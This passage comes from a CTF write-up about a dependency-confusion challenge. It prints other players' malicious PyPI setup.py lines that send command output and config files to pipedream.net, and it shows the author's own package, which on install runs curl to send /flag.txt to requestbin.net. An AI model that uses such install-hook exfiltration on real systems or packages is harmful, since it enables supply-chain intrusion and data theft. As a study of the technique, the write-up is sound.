+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /etc/flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#        requests.get(&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;+os.popen(&quot;id&quot;).read()) #cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /var/www/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /var/www/ | base64&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337420&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://enc2i9ljmjy100e.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /etc/pip.conf | base64&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We further analyze the endpoints with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -rin &quot;http.*?&quot; -o | sort | uniq &lt;/code&gt;, and found out that there are only three links:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://en4r9c8fvgmzozb.m.pipedream.net
+https://enc2i9ljmjy100e.m.pipedream.net
+https://ene63d9dv33i6ch.m.pipedream.net
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now that seems like people are uploading python packages as payloads in order to run commands on the server. After some more googling I found &lt;a href=&quot;https://pydist.com/blog/extra-index-url&quot;&gt;this article&lt;/a&gt;, which suggests that the server could be pulling packages matching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf-q21-empire-tmp-[a-z0-9\-]{5,10}&lt;/code&gt; from the &lt;strong&gt;public repo PyPI instead of a private one&lt;/strong&gt;. That means we could upload a malicious package as a payload to the PyPI and the server will trust and install it.&lt;/p&gt;
+
+&lt;p&gt;So I followed &lt;a href=&quot;https://packaging.python.org/tutorials/packaging-projects/&quot;&gt;this guide&lt;/a&gt; to craft a package. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.py&lt;/code&gt; is as follows (modified from the cached package):&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;setuptools&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;setuptools.command.install&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PostInstallCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Post-installation for installation mode.&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;#os.popen(&quot;pwd&quot;)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ctf-q21-empire-tmp-bw134346&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Bye world&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;0.9.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;packages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;main&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setup_requires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&apos;requests&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cmdclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&apos;install&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PostInstallCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;curl &quot;https://requestbin.net/r/gf5gqdpw?hehe=$(cat /flag.txt | base64 -w 0)&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64 -w 0&lt;/code&gt; because by default it inserts an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt; after every 76 characters. The command would not work with end line characters.&lt;/p&gt;
+
+&lt;p&gt;Then, after a short wait, the requestbin showed this result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/requestbin.png&quot; alt=&quot;requestbin-b64.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which translates into&lt;/p&gt;
+
